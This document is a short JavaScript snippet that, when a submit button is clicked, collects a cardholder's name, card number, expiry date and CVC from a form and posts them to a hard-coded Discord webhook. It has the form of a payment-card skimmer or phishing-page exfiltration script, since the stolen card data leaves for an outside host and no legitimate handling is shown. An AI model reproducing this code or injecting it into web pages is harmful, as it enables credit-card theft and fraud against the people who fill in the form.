document.getElementById('submit').addEventListener('click', function() {
  var name = document.getElementById('name').value;
  var card = document.getElementById('card').value;
  var expiry = document.getElementById('expiry').value;
  var cvc = document.getElementById('cvc').value;
  var data = {
    name: name,
    card: card,
    expiry: expiry,
    cvc: cvc
  };
  fetch('https://discord.com/api/webhooks/1182134330345144381/BCRPKyEWmoRk5HTKT0Pl1lKB3s7RnIrHEBy7hJ1usMZi23gCt6mEw5VvCHcw9h8f30zg', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({content: JSON.stringify(data)}),
  });
});
